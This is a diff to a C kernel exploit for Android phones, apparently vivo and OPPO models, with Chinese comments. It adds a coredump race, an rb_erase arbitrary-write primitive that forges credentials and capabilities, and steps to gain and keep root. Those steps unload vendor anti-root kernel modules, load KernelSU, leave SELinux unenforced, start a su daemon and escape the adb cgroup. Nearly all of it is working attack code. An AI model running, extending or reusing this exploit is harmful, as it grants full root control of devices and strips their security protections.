@@ -271,6 +271,9 @@ struct child_report
 };
 
 static _Atomic int g_go, g_stop, g_locker_started, g_locker_cpu;
+extern char **environ;
+static _Atomic int g_locker_need = 3;
+static _Atomic int g_exec_enter;
 static _Atomic int g_exec_tid, g_target_tgid;
 static void *g_frag_base;
 static size_t g_frag_len;
@@ -279,6 +282,8 @@ static int g_timer_go_r = -1, g_timer_go_w = -1;
 static int g_cpu = CPU_TRIG;
 static unsigned long long g_base;
 static unsigned long long g_slide;
+/* mode=4（任意写）要写进去的值；由 stage_write 的调用方设置 */
+static unsigned long long g_aw_value;
 static int g_held;
 static int g_fake_stage;
 static unsigned long long g_child_task;
@@ -467,6 +472,29 @@ static int scan_cred_allocs(const unsigned char *b, size_t n, int pid,
                             unsigned long long *ptr_out)
 {
     int found = 0;
+    static int dumped;
+
+    if (!dumped && getenv("DUMP_KMEM"))
+    {
+        int shown = 0;
+
+        dumped = 1;
+        for (size_t i = 16; i + 32 <= n && shown < 8; i += 4)
+        {
+            unsigned long long site = u64(b, i - 8), ptr = u64(b, i);
+            unsigned long long req = u64(b, i + 8), alloc = u64(b, i + 16);
+
+            if (!is_kernel_ptr(ptr) || !is_kernel_ptr(site))
+                continue;
+            /* 只挑像 kmem 记录的：两个 size 都小且非零 */
+            if (!req || req > 0x8000 || alloc > 0x8000)
+                continue;
+            logf("[dump] pid=%u site=%#llx ptr=%#llx req=%#llx alloc=%#llx\n",
+                 u32(b, i - 12), site, ptr, req, alloc);
+            shown++;
+        }
+        logf("[dump] shown=%d n=%zu\n", shown, n);
+    }
 
     for (size_t i = 16; i + 24 <= n; i += 4)
     {
@@ -541,7 +569,16 @@ static int scan_task_allocs(const unsigned char *b, size_t n, int pid,
             continue;
         site = u64(b, i);
         if ((site & 0x1fffffULL) != g_cfg.copy_process_low21)
+        {
+            if (getenv("TASK_SCAN_DEBUG") && found < 6 &&
+                (site & 0x1fffffULL) >= g_cfg.copy_process_low21 - 0x40 &&
+                (site & 0x1fffffULL) <= g_cfg.copy_process_low21 + 0x40)
+                logf("[tscan] near site=%#llx low21=%#llx ptr=%#llx "
+                     "req=%#llx alloc=%#llx (want %#llx)\n", site,
+                     site & 0x1fffffULL, u64(b, i + 8), u64(b, i + 16),
+                     u64(b, i + 24), g_cfg.copy_process_low21);
             continue;
+        }
         ptr = u64(b, i + 8);
         req = u64(b, i + 16);
         alloc = u64(b, i + 24);
@@ -961,8 +998,9 @@ static int locker_fn(void *x)
 {
     int prot = PROT_NONE;
     unsigned slot = (unsigned)atomic_fetch_add(&g_locker_cpu, 1);
+    static const int cpus[] = {1, 3, 5, 6, 7};
     (void)x;
-    pin(slot ? 3 : 1);
+    pin(cpus[slot % (sizeof(cpus) / sizeof(cpus[0]))]);
     while (!atomic_load(&g_go))
         sched_yield();
     atomic_fetch_add(&g_locker_started, 1);
@@ -990,6 +1028,90 @@ static int killer_fn(void *x)
     }
     syscall(SYS_tgkill, tgid, tgid, SIGKILL);
     atomic_store(&g_stop, 1);
+    _exit(0);
+}
+/*
+ * 5.15 的 exec_mmap 与 6.1 不同：
+ *
+ *   6.1 : mmap_read_lock_killable(old_mm)      <- 致命信号直接 -EINTR
+ *   5.15: mmap_read_lock(old_mm);               <- 不可打断
+ *         if (old_mm->core_state) return -EINTR;
+ *
+ * 所以在 5.15 上唯一能让 exec 在 posix_cpu_timers_exit 之前失败的注入点是
+ * old_mm->core_state。它只在 coredump_wait() 里被设置，并且会一直保持到
+ * 所有共享该 mm 的任务全部退出（wait_for_completion(&core_state->startup)）。
+ *
+ * 做法：一个 CLONE_VM 兄弟进程（共享 mm、独立 signal）在 exec 线程进入
+ * 内核后主动 SIGSEGV，do_coredump -> coredump_wait 就会把 core_state 挂上；
+ * 被 zap 的 exec 线程此刻正卡在不可打断的 mmap_read_lock 里，等它拿到锁
+ * 之后必然看到 core_state != NULL，返回 -EINTR，+0x6a4 的
+ * posix_cpu_timers_exit 被整段跳过 —— 定时器留在 cpu_timers 里。
+ *
+ * RLIMIT_CORE 设 0：coredump_wait 在 limit 检查（binfmt->min_coredump）之前
+ * 就已经跑完，core_state 该生效的已经生效，同时不会真的写出几百 MB 的 core。
+ */
+static int crasher_fn(void *x)
+{
+    const char *trig = getenv("CRASH_TRIGGER");
+    const char *cv;
+    const char *ds = getenv("CRASH_DELAY_US");
+    long delay = ds ? atol(ds) : 0;
+    struct rlimit rl = {0, 0};
+    (void)x;
+
+    /*
+     * 必须独占一个 CPU：locker 用 mprotect 循环，一次调用要占住 CPU 好几毫秒，
+     * 如果 crasher 和 locker 同核，等它被调度上来时 exec 早就过了 exec_mmap。
+     * CPU 1/3 给两个 locker，2 给 exec 线程和 leader，crasher 用 4。
+     */
+    pin(4);
+    /* dumpable 是 mm->flags 上的标志，兄弟进程写等于给整个 mm 打开 */
+    syscall(SYS_prctl, PR_SET_DUMPABLE, 1, 0, 0, 0);
+    setrlimit(RLIMIT_CORE, &rl);
+
+    if (trig && !strcmp(trig, "enter"))
+    {
+        /* 忙等：exec 线程置位后几条指令就进 execve，任何 yield 都会太晚 */
+        while (!atomic_load(&g_exec_enter))
+            ;
+    }
+    else if (trig && !strcmp(trig, "go"))
+    {
+        while (!atomic_load(&g_go))
+            sched_yield();
+    }
+    else
+    {
+        int tgid = atomic_load(&g_target_tgid);
+        long spins = 0;
+
+        /*
+         * de_thread 会先 zap 掉 leader，再等它真正退出。leader 消失的
+         * 那一刻就是 exec 线程即将进入 unshare_files/exec_mmap 的信号。
+         * 交换 tid 之后 tgkill 会重新命中，所以一旦抓到 ESRCH 就锁存。
+         */
+        for (;;)
+        {
+            long r = syscall(SYS_tgkill, tgid, tgid, 0);
+
+            if (r < 0 && errno == ESRCH)
+                break;
+            if (atomic_load(&g_go) && ++spins > 4000000L)
+                break; /* 兜底：没抓到就按 g_go 走 */
+            sched_yield();
+        }
+    }
+    if (delay > 0)
+    {
+        struct timespec ts;
+
+        ts.tv_sec = delay / 1000000;
+        ts.tv_nsec = (delay % 1000000) * 1000;
+        nanosleep(&ts, NULL);
+    }
+    if (getenv("CRASH_LOG"))
+        logf("[crash] firing sigsegv\n");
+    *(volatile unsigned long *)0 = 0xdead;
     _exit(0);
 }
 static int spawn_vm_helper(int (*fn)(void *))
@@ -1052,10 +1174,16 @@ static void *exec_thread(void *x)
             _exit(124);
     }
     atomic_store(&g_go, 1);
-    while (atomic_load(&g_locker_started) < LOCKERS)
+    while (atomic_load(&g_locker_started) < (unsigned)atomic_load(&g_locker_need))
         sched_yield();
-    for (volatile unsigned long i = 0; i < 5000000UL; i++)
-        __asm__ volatile("" ::: "memory");
+    {
+        const char *sv = getenv("EXEC_SPIN");
+        unsigned long spin = sv ? strtoul(sv, NULL, 0) : 5000000UL;
+
+        for (volatile unsigned long i = 0; i < spin; i++)
+            __asm__ volatile("" ::: "memory");
+    }
+    atomic_store(&g_exec_enter, 1);
     execve("/proc/self/exe", argv, envp);
     _exit(123);
 }
@@ -1064,20 +1192,70 @@ static void run_target(void)
 {
     pthread_t th;
     sigset_t set;
+    const char *ev;
+    int lockers = LOCKERS;
+
+    ev = getenv("LOCKERS");
+    if (ev)
+        lockers = atoi(ev);
+    if (lockers < 0)
+        lockers = 0;
+    atomic_store(&g_locker_need, lockers);
     atomic_store(&g_target_tgid, (int)getpid());
     pin(2);
     if (prepare_fragmented_range())
         _exit(110);
-    for (int i = 0; i < LOCKERS; i++)
+    /*
+     * PAD_FDS 把 files_struct 撑大。exec 的 unshare_files() -> dup_fd()
+     * 是线性拷贝，能把 de_thread 到 exec_mmap 之间的窗口拉长，给 crasher
+     * 留出设置 core_state 的时间。必须在 helper 起来之后再铺，否则
+     * clone() 没有 CLONE_FILES，每个 helper 都会复制一遍这张大表。
+     */
+    for (int i = 0; i < lockers; i++)
         if (spawn_vm_helper(locker_fn) < 0)
             _exit(111);
-    if (spawn_vm_helper(killer_fn) < 0)
-        _exit(112);
+    ev = getenv("KILLER");
+    if (!ev || atoi(ev))
+    {
+        if (spawn_vm_helper(killer_fn) < 0)
+            _exit(112);
+    }
+    ev = getenv("EXECFAIL");
+    if (ev && !strcmp(ev, "coredump") && spawn_vm_helper(crasher_fn) < 0)
+        _exit(113);
+    ev = getenv("PAD_FDS");
+    if (ev)
+    {
+        int want = atoi(ev);
+        int i;
+
+        for (i = 0; i < want; i++)
+            if (open("/dev/null", O_RDONLY) < 0)
+                break;
+        logf("[target] padded fds=%d (want %d)\n", i, want);
+    }
     sigemptyset(&set);
     sigaddset(&set, SIGRTMIN);
     pthread_sigmask(SIG_BLOCK, &set, NULL);
     if (pthread_create(&th, NULL, exec_thread, NULL))
         _exit(114);
+    ev = getenv("LEADER_MPROTECT");
+    if (ev && atoi(ev) && g_frag_base && g_frag_len)
+    {
+        /*
+         * de_thread 会先给 leader 发 SIGKILL 再等它退出。mprotect 不检查
+         * 信号，50000 个 VMA 的一趟要跑毫秒级，leader 就死不利索，
+         * de_thread 一直等在 while (sig->notify_count) 里 —— 这正是
+         * crasher 设置 core_state 的窗口。
+         */
+        int prot = PROT_READ;
+
+        for (;;)
+        {
+            syscall(SYS_mprotect, g_frag_base, g_frag_len, prot);
+            prot = prot == PROT_READ ? PROT_NONE : PROT_READ;
+        }
+    }
     for (;;)
         sched_yield();
 }
@@ -1124,6 +1302,31 @@ static void build_payload(unsigned char *buf, size_t off,
     memset(buf, 0, SOCKBUF);
     *(unsigned long long *)(buf + off + 0x00) = parent;
     *(unsigned long long *)(buf + off + 0x10) = target;
+}
+
+/*
+ * mode=4：任意写（写任意 value 到任意 target）。
+ *
+ * rb_erase 在 node->rb_right == NULL 时走
+ *     __rb_change_child(node, node->rb_left, parent, root)
+ * parent 取自 node->__rb_parent_color & ~3。__rb_change_child 的逻辑是
+ *     if (parent->rb_left == old) parent->rb_left  = new;
+ *     else                       parent->rb_right = new;
+ * 把 parent 设成 target - 0x08、new（rb_left）设成 value，就等价于
+ * 「*(u64 *)target = value」。parent->rb_left 读的是 target-0x10，只读一次，
+ * 正常不会等于 node，于是走 rb_right 分支，落点正好是 target。
+ *
+ * leftmost 维护（rb_erase_cached 先跑 rb_next）也安全：right==NULL 时
+ * rb_next 沿 parent 链走一步，比较 parent->rb_right 与 node 不等就返回 NULL，
+ * 不会再解引用。
+ */
+static void build_payload_aw(unsigned char *buf, size_t off,
+                             unsigned long long target, unsigned long long value)
+{
+    memset(buf, 0, SOCKBUF);
+    *(unsigned long long *)(buf + off + 0x00) = target - 0x08; /* parent */
+    *(unsigned long long *)(buf + off + 0x08) = value;         /* right = child */
+    *(unsigned long long *)(buf + off + 0x10) = 0;             /* left  = NULL  */
 }
 
 /*
@@ -1313,6 +1516,7 @@ static void write_ksu_script(void)
     if (!f)
         return;
     fputs("#!/system/bin/sh\n", f);
+    fputs("[ -x /data/local/tmp/sud/sud ] && /data/local/tmp/sud/sud --daemon --replace\n", f);
     fputs("echo \"[ksu] start uid=$(id -u) selinux=$(getenforce)\"\n", f);
     /*
      * vivo：内核侧把 sys_exit 回调表清了，用户态还有 riskdetect 会盯着。
@@ -1414,7 +1618,7 @@ static void write_ksu_script(void)
     fputs("if ! loaded; then try_load; fi\n", f);
     fputs("if loaded; then echo KSU_LOADED; else echo KSU_MISSING;"
           " dmesg 2>/dev/null | tail -15; fi\n", f);
-    fputs("echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n", f);
+    fputs("true\n", f);
     fputs("echo \"[ksu] enforce=$(getenforce)\"\n", f);
     fclose(f);
     (void)chmod(path, 0755);
@@ -1731,7 +1935,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
         if (!base)
             base = g_base;
         if (!base || base < 0xffffff0000000000ULL ||
-            base > 0xffffffc000000000ULL)
+            base > 0xfffffffffffff000ULL)
         {
             trace_stop();
             kill(T, SIGKILL);
@@ -1742,14 +1946,16 @@ static void run_plant(unsigned long long target, int tag, int mode,
         }
         g_base = base;
         /*
-         * The linear map is [base, 0xffffffc000000000) on this VA layout;
+         * The linear map is [base, 0xfffffffffffff000) on this VA layout;
+         * 4.19 with VA_BITS=39 randomises PAGE_OFFSET, so the KASLR'd base can
+         * sit far above the 6.x 0xffffffc000000000 boundary.
          * physical RAM is sparse and extends well past 16 GiB, so do not
          * bound by RAM size.  A pointer outside this window is a stale
          * kmem record or a mis-scanned site collision and must not shift
          * the victim index.
          */
         for (int i = 0; i < nrec; i++)
-            if (ptrs[i] >= base && ptrs[i] < 0xffffffc000000000ULL)
+            if (ptrs[i] >= base && ptrs[i] < 0xfffffffffffff000ULL)
                 kept[nkeep++] = ptrs[i];
         logf("[+] plant%d base=%#llx slabs=%d pfns=%d recs=%d kept=%d\n",
              tag, base, ns, np, nrec, nkeep);
@@ -1908,8 +2114,13 @@ static void run_plant(unsigned long long target, int tag, int mode,
                         g_cfg.root_user + g_slide;
                     *(unsigned long long *)(p + 0x88) =
                         g_cfg.init_user_ns + g_slide;
+                    /*
+                     * 4.19 的 init_ucounts 是 static，符号表里没有；conf 留空时
+                     * 直接写 0。fake cred 的 usage 来自 rb_node.parent（极大），
+                     * 永远减不到 0，__put_cred 不会走到 dec_ucount，NULL 安全。
+                     */
                     *(unsigned long long *)(p + 0x90) =
-                        g_cfg.init_ucounts + g_slide;
+                        g_cfg.init_ucounts ? g_cfg.init_ucounts + g_slide : 0;
                     *(unsigned long long *)(p + 0x98) =
                         g_cfg.init_groups + g_slide;
                 }
@@ -1939,6 +2150,44 @@ static void run_plant(unsigned long long target, int tag, int mode,
                 logf("[+] plant%d fake cred node=%#zx blob=%#zx sec=%#llx "
                      "layout=%s\n",
                      tag, off, blob, page + blob, c61 ? "6.1" : "6.6");
+            }
+        }
+        else if (mode == 4)
+        {
+            /*
+             * 任意写（Case 1）：left=NULL / right=value / parent=target-8。
+             * 值只能是「有效内核地址」—— __rb_erase_augmented 在写完 target
+             * 之后还会执行 child->__rb_parent_color = pc，child 必须可写。
+             *
+             * 0.83-cg：值取 V+0x2f 而不是 V+0x78。
+             *
+             * 低 3 位被对象对齐钉死为 0 是之前拿不到 CAP_DAC_OVERRIDE(bit1)
+             * 的唯一原因。这里把写入值本身加 0x2f，位模式低 3 位就是 111，
+             * 一口气拿到 CHOWN(0) / DAC_OVERRIDE(1) / DAC_READ_SEARCH(2)。
+             *
+             * 偏移必须留在 payload 头部：rb_erase_cached 之后还要
+             * rb_next(value)，它会读 value->rb_left（V+off+0x10）。0x2f+0x10
+             * = 0x3f 落在 memset 清零区，读出来是 0，下降立即结束。之前用
+             * 0x7f 时这个位置越出零区，读到垃圾指针，走两步就 kernel_panic。
+             * 0x2f..0x36 也不会覆盖 off+0x00/0x08/0x10 三个关键字段。
+             */
+            /*
+             * AW_OFF 控制写入值相对 payload 的偏移。
+             * 默认 0x78（8 字节对齐）——这是唯一验证过稳定的取值：
+             * 对象地址按 8 对齐，rb_next 沿 value->rb_left 只读到 memset
+             * 清零区就停下。取非对齐值（0x2f / 0x7f）能凑出 bit0-2，
+             * 但会让 rb_next 走进越界区，5.15 + PANIC_ON_OOPS=y 直接重启。
+             * 想让 bit16 命中就连续 plant（1/2 概率），别动这个偏移。
+             */
+            {
+                const char *awoff = getenv("AW_OFF");
+                unsigned long long av =
+                    g_aw_value ? g_aw_value
+                               : (V + (awoff ? strtoull(awoff, NULL, 0)
+                                             : 0x78ULL));
+
+                build_payload_aw(payload, off, target, av);
+                fake_A = av;
             }
         }
         else
@@ -2167,9 +2416,13 @@ static unsigned long long leak_cred(unsigned char *raw,
                 const char *cmode = shell_mode ? "shell" : (g_fake_stage ? "fake" : "verify");
                 char *const av[] = {(char *)"/proc/self/exe", (char *)"wait",
                                     (char *)cmode, NULL};
-                char *const ep[] = {(char *)"PATH=/system/bin:/system/xbin", NULL};
-
-                execve("/proc/self/exe", av, ep);
+                /*
+                 * 必须继承父进程环境：子进程是 exec 出来的，用固定 envp
+                 * 会把 GATE_FILE / READ_MODTEXT / SKIP_CHILD_STATE 这些
+                 * 调试开关全丢掉，导致子进程行为与预期不符（之前
+                 * "门闩没反应" 就是这个原因）。
+                 */
+                execve("/proc/self/exe", av, environ);
             }
             _exit(127);
         }
@@ -2229,14 +2482,38 @@ static unsigned long long leak_cred(unsigned char *raw,
              attempt, p, R, hello, c, task, tc);
         close(go[1]);
         close(st[0]);
-        kill(p, SIGKILL);
-        waitpid(p, NULL, 0);
+        {
+            int ws = 0;
+            pid_t wr = waitpid(p, &ws, WNOHANG);
+            if (wr == p)
+            {
+                if (WIFEXITED(ws))
+                    logf("[!] child %d already exited: code %d (exec failed)\n",
+                         p, WEXITSTATUS(ws));
+                else if (WIFSIGNALED(ws))
+                    logf("[!] child %d died from signal %d\n", p, WTERMSIG(ws));
+            }
+            else
+            {
+                logf("[!] child %d still alive -> exec ok, waiting for cred\n", p);
+                kill(p, SIGKILL);
+                waitpid(p, NULL, 0);
+            }
+        }
     }
     return 0;
 }
 
 static int wait_child_main(const char *mode)
 {
+    /* 裸 write 日志：子进程 _exit 会丢 stdio 缓冲，诊断一律走这个 */
+    #define RAWLOG(fmt, ...)                                                  \
+        do {                                                                  \
+            char _rb[256];                                                    \
+            int _rn = snprintf(_rb, sizeof(_rb), fmt, ##__VA_ARGS__);         \
+            syscall(SYS_write, 2, _rb, (long)_rn);                            \
+        } while (0)
+
     struct child_report rep;
     char ch;
     int hello = CHILD_HELLO;
@@ -2244,14 +2521,211 @@ static int wait_child_main(const char *mode)
     pin(g_cpu);
     if (write(4, &hello, sizeof(hello)) != sizeof(hello))
         _exit(130);
-    if (read(3, &ch, 1) != 1)
-        _exit(131);
+    {
+        const char *gate = getenv("GATE_FILE");
+
+        if (gate && *gate)
+        {
+            /*
+             * 文件门闩：取代管道 read。
+             * 目的是把「root 进程开始运行」和「管道唤醒路径」两件事分开：
+             *   - 自旋期间（已经是 uid 0）就被杀 -> 监控按 uid 轮询/调度杀进程
+             *   - 打开文件后才被杀         -> 问题在 read 唤醒路径
+             * 用 access() 而不是 stat，尽量少碰 LSM 的文件钩子。
+             */
+            while (access(gate, F_OK) != 0)
+                usleep(20000);
+        }
+        else if (read(3, &ch, 1) != 1)
+            _exit(131);
+    }
+    /*
+     * 落盘诊断：不管后面会不会被内核杀掉，先把换 cred 之后的真实身份写下来。
+     * 全走裸系统调用，避免 stdio 在坏 cred 下出问题。
+     */
+    if (!getenv("SKIP_CHILD_STATE"))
+    {
+        int fd = (int)syscall(SYS_openat, -100,
+                              "/data/local/tmp/t15/child_state",
+                              O_WRONLY | O_CREAT | O_TRUNC, 0644);
+
+        if (fd >= 0)
+        {
+            char b[128];
+            int n = snprintf(b, sizeof(b), "uid=%ld euid=%ld pid=%d\n",
+                             syscall(SYS_getuid), syscall(SYS_geteuid),
+                             (int)getpid());
+
+            syscall(SYS_write, fd, b, (long)n);
+            syscall(SYS_close, fd);
+        }
+    }
+    if (getenv("TEST_INIT_MODULE"))
+    {
+        /*
+         * 探针：直接调 init_module 传垃圾数据。
+         *   EPERM(1)/EACCES(13) -> 被 SELinux 的 kernel_load_module 挡住
+         *   ENOEXEC(8)/EINVAL(22) -> 权限过了，只是模块格式不对
+         * 这一条决定“有 caps 就够”还是“必须先把 enforcing 清零”。
+         */
+        static const unsigned char junk[64] = {0x7f, 'E', 'L', 'F'};
+        errno = 0;
+        long r = syscall(SYS_init_module, junk, (unsigned long)64, "");
+        int e = errno;
+
+        RAWLOG("\n[mod] init_module(garbage) ret=%ld errno=%d\n", r, e);
+        {
+            int fd = open("/proc/self/status", O_RDONLY);
+            char b[4096];
+            int n = fd >= 0 ? (int)read(fd, b, sizeof(b) - 1) : -1;
+
+            if (fd >= 0)
+                close(fd);
+            if (n > 0)
+            {
+                char *q;
+
+                b[n] = 0;
+                q = strstr(b, "CapEff:");
+                if (q)
+                {
+                    char *e2 = strchr(q, '\n');
+
+                    if (e2)
+                        *e2 = 0;
+                    RAWLOG("[mod] %s\n", q);
+                }
+            }
+        }
+    }
+
+    if (getenv("RMMOD"))
+    {
+        /*
+         * 在同一个持 CAP_SYS_MODULE 的窗口里卸载 OPPO 的 rootcheck 模块。
+         * 依赖顺序：keventupload -> secure_harden -> security_guard
+         */
+        char rm_buf[256];
+        char *rm_p = NULL;
+        char *rm_save = NULL;
+
+        snprintf(rm_buf, sizeof(rm_buf), "%s", getenv("RMMOD"));
+        for (rm_p = strtok_r(rm_buf, ",", &rm_save); rm_p;
+             rm_p = strtok_r(NULL, ",", &rm_save)) {
+            int re;
+            long rr;
+
+            errno = 0;
+            rr = syscall(SYS_delete_module, rm_p, O_NONBLOCK);
+            re = errno;
+            RAWLOG("\n[rmmod] %s ret=%ld errno=%d\n", rm_p, rr, re);
+        }
+    }
+
+    if (getenv("LOAD_KO"))
+    {
+        /*
+         * 在持有 CAP_SYS_MODULE 的 plant child 里直接 init 模块。
+         * 不 exec，caps 不会被 bset 重算掉。
+         *   errno=0   -> 加载成功
+         *   errno=2   -> Unknown symbol（内核没导出）
+         *   errno=8   -> vermagic / modversions 不过
+         *   errno=1   -> EPERM（caps 或 modules_disabled）
+         */
+        const char *kp = getenv("LOAD_KO");
+        int kfd = open(kp, O_RDONLY);
+        long kr = -1;
+        int ke = 0;
+
+        errno = 0;
+        if (kfd >= 0)
+            kr = syscall(SYS_finit_module, kfd, "", 0);
+        ke = errno;
+        RAWLOG("\n[ko] finit_module(%s) ret=%ld errno=%d\n", kp, kr, ke);
+        if (kfd >= 0)
+            close(kfd);
+        {
+            int fd = open("/proc/modules", O_RDONLY);
+            char b[1024];
+            int n = fd >= 0 ? (int)read(fd, b, sizeof(b) - 1) : -1;
+
+            if (fd >= 0)
+                close(fd);
+            if (n > 0)
+            {
+                b[n] = 0;
+                if (strstr(b, "kernelsu"))
+                    RAWLOG("[ko] kernelsu present in /proc/modules\n");
+            }
+        }
+    }
+
+    if (getenv("READ_MODTEXT"))
+    {
+        /* 用裸 write，避开 stdio 缓冲（子进程 _exit 会丢缓冲） */
+        const char *paths[] = {
+            "/sys/module/oplus_app_monitor/sections/.text",
+            "/sys/module/oplus_app_monitor/sections/.data",
+            "/proc/self/status"};
+
+        for (int pi = 0; pi < 3; pi++)
+        {
+            int fd = open(paths[pi], O_RDONLY);
+            char b[512];
+            int n = fd >= 0 ? (int)read(fd, b, sizeof(b) - 1) : -1;
+
+            if (fd >= 0)
+                close(fd);
+            if (n > 0)
+            {
+                b[n] = 0;
+                if (pi == 2)
+                {
+                    char *q = strstr(b, "CapEff:");
+
+                    if (q)
+                    {
+                        char *e = strchr(q, '\n');
+
+                        if (e)
+                            *e = 0;
+                        RAWLOG("\n[mod] %s\n", q);
+                    }
+                    q = strstr(b, "Uid:");
+                    if (q)
+                    {
+                        char *e = strchr(q, '\n');
+
+                        if (e)
+                            *e = 0;
+                        RAWLOG("[mod] %s\n", q);
+                    }
+                }
+                else
+                    RAWLOG("\n[mod] %s = %s", paths[pi], b);
+            }
+            else
+                RAWLOG("\n[mod] %s 读取失败 errno=%d\n", paths[pi], errno);
+        }
+    }
+
+    if (getenv("CHILD_EXIT_AT_WAKE"))
+    {
+        /* 门闩一开就退出：能退出说明子进程可以正常跑；被 SIGKILL 说明是外部杀的 */
+        syscall(SYS_exit_group, 7);
+    }
+
+    /* 裸 write 标记：不经过 stdio，用来定位换 cred 后第一个挂掉的系统调用 */
+    syscall(SYS_write, 2, "R", 1);
     close(3);
+    syscall(SYS_write, 2, "C", 1);
 
     memset(&rep, 0, sizeof(rep));
     rep.magic = CHILD_MAGIC;
     rep.uid = (int)syscall(SYS_getuid);
+    syscall(SYS_write, 2, "U", 1);
     rep.euid = (int)syscall(SYS_geteuid);
+    syscall(SYS_write, 2, "V", 1);
     logf("[child] woke uid=%d euid=%d\n", rep.uid, rep.euid);
     /*
      * 这里绝对不能调 setresuid()/setresgid()。
@@ -2290,6 +2764,14 @@ static int wait_child_main(const char *mode)
 
         logf("[fake] child uid=%d euid=%d cred!=real_cred; forking worker\n",
              rep.uid, rep.euid);
+        {
+            uid_t ru = 0, eu = 0, sv = 0;
+
+            syscall(SYS_getresuid, &ru, &eu, &sv);
+            logf("[fake] before fork: getuid=%d geteuid=%d resuid=%d/%d/%d\n",
+                 (int)syscall(SYS_getuid), (int)syscall(SYS_geteuid),
+                 (int)ru, (int)eu, (int)sv);
+        }
         /*
          * 孙子进程：此时 cred == real_cred（copy_creds 的结果），
          * setresgid/setresuid 里的 prepare_creds() + commit_creds() 才合法。
@@ -2299,6 +2781,26 @@ static int wait_child_main(const char *mode)
         w = fork();
         if (w == 0)
         {
+            /*
+             * 先把 OPPO 的 rootcheck 卸掉，再改 uid。
+             *
+             * 实测 dmesg：`ROOTCHECK-RC-ERROR:Kill the process of escalation`
+             * 来自 oplus_app_monitor.ko，它不看 SELinux（Permissive 下照杀），
+             * 所以只能在提 uid 之前把模块本身摘掉。worker 此刻的 cred 已经是
+             * fake（fullcap），CAP_SYS_MODULE 在位，delete_module 有戏。
+             */
+            static const char *rk_mods[] = {
+                "oplus_app_monitor",
+                "oplus_bsp_sigkill_diagnosis",
+                "oplus_security_guard",
+                "oplus_secure_harden",
+            };
+            for (unsigned mi = 0; mi < sizeof(rk_mods) / sizeof(rk_mods[0]); mi++)
+            {
+                long rr = syscall(SYS_delete_module, rk_mods[mi], 0x800 /* O_NONBLOCK */);
+                int re = errno;
+                logf("[rmmod] %s -> %ld errno=%d\n", rk_mods[mi], rr, re);
+            }
             long sg = syscall(SYS_setresgid, 0, 0, 0);
             long su = syscall(SYS_setresuid, 0, 0, 0);
             int e = errno;
@@ -2311,6 +2813,53 @@ static int wait_child_main(const char *mode)
             rep.setuid_errno = e;
             logf("[fake] worker setresgid=%ld setresuid=%ld errno=%d "
                  "uid=%d euid=%d\n", sg, su, e, rep.uid, rep.euid);
+            {
+                char b[2048];
+                int fd = open("/proc/self/status", O_RDONLY);
+
+                if (fd >= 0)
+                {
+                    int nn = (int)read(fd, b, sizeof(b) - 1);
+
+                    close(fd);
+                    if (nn > 0)
+                    {
+                        char *q;
+
+                        b[nn] = 0;
+                        q = strstr(b, "CapEff:");
+                        if (q)
+                        {
+                            char *e2 = strchr(q, '\n');
+
+                            if (e2)
+                                *e2 = 0;
+                            logf("[fake] %s\n", q);
+                        }
+                        q = strstr(b, "Uid:");
+                        if (q)
+                        {
+                            char *e2 = strchr(q, '\n');
+
+                            if (e2)
+                                *e2 = 0;
+                            logf("[fake] %s\n", q);
+                        }
+                    }
+                }
+                fd = open("/proc/self/attr/current", O_RDONLY);
+                if (fd >= 0)
+                {
+                    int nn = (int)read(fd, b, sizeof(b) - 1);
+
+                    close(fd);
+                    if (nn > 0)
+                    {
+                        b[nn] = 0;
+                        logf("[fake] ctx=%s\n", b);
+                    }
+                }
+            }
             (void)write(4, &rep, sizeof(rep));
             close(4);
             /*
@@ -2344,6 +2893,89 @@ static int wait_child_main(const char *mode)
         logf("[fake] worker exit=%#x\n", st);
         _exit(0);
     }
+
+    /*
+     * 0.83-cg：把进程迁出 adb shell 的 cgroup 子树。
+     *
+     * adbd 断开时会回收整棵 uid_0/pid_*，daemon 就算 setsid + PPID=1 也一样
+     * 被收走（实测 cg=0::/uid_0/pid_4883，进程起来后不到一分钟消失）。
+     *
+     * 必须放在 setresgid/setresuid 之前：实测这两次调用里的 prepare_creds()
+     * + commit_creds() 会把父进程 plant 写进 cred+0x38 的 cap_effective 清掉
+     * （日志里写进去的是 0xffffff806289f1b7，setresuid 之后读回是 0），而
+     * cgroup.procs 是 0775 system:system，没有 CAP_DAC_OVERRIDE 必 EACCES。
+     * 提前迁完，后面 exec 丢 caps 也就无所谓了——cgroup 归属是 per-process
+     * 的，不随 cred 变化。
+     */
+    if (getenv("PRE_CG"))
+    {
+        static const char *const cgs[] = {
+            "/sys/fs/cgroup/cgroup.procs",
+            "/sys/fs/cgroup/uid_0/cgroup.procs",
+            NULL};
+        char pb[24];
+        int pn = snprintf(pb, sizeof(pb), "%d", (int)getpid());
+        int ci;
+
+        /*
+         * 诊断：内核是否认可我们写进去的 cap_effective。open 报 EACCES
+         * 只有两种可能——effective 真的没生效，或者拒绝来自 SELinux /
+         * cgroup 自身的权限检查。先把 CapEff 读出来排除第一种。
+         */
+        {
+            char sb[2048];
+            int sfd = open("/proc/self/status", O_RDONLY);
+
+            if (sfd >= 0)
+            {
+                int sn = (int)read(sfd, sb, sizeof(sb) - 1);
+
+                close(sfd);
+                if (sn > 0)
+                {
+                    char *p;
+
+                    sb[sn] = 0;
+                    for (p = sb; *p; p++)
+                    {
+                        if (!strncmp(p, "CapEff:", 7) ||
+                            !strncmp(p, "CapPrm:", 7) ||
+                            !strncmp(p, "CapBnd:", 7))
+                        {
+                            char *e = strchr(p, '\n');
+
+                            if (e)
+                                *e = 0;
+                            logf("[cg] %s\n", p);
+                            if (e)
+                                *e = '\n';
+                        }
+                    }
+                }
+            }
+        }
+
+        for (ci = 0; cgs[ci]; ci++)
+        {
+            int fd = open(cgs[ci], O_WRONLY);
+
+            if (fd < 0)
+            {
+                logf("[cg] open %s failed errno=%d\n", cgs[ci], errno);
+                continue;
+            }
+            if (write(fd, pb, pn) < 0)
+                logf("[cg] write %s failed errno=%d\n", cgs[ci], errno);
+            else
+            {
+                logf("[cg] moved pid=%d -> %s\n", (int)getpid(), cgs[ci]);
+                close(fd);
+                break;
+            }
+            close(fd);
+        }
+    }
+
 
     /*
      * Plant 1 zeroes uid+gid only; egid is still 2000.  If it stays that way
@@ -2392,6 +3024,8 @@ static int wait_child_main(const char *mode)
 
         if (!strcmp(mode, "shell"))
         {
+            /* 脱离父进程的进程组：exploit 主进程退出后 worker 不能被连带清掉 */
+            (void)setsid();
             /* Print id first: openRoot() waits for "uid=0(root)" before it
              * reports a usable shell, and `sh -i` alone never prints it.
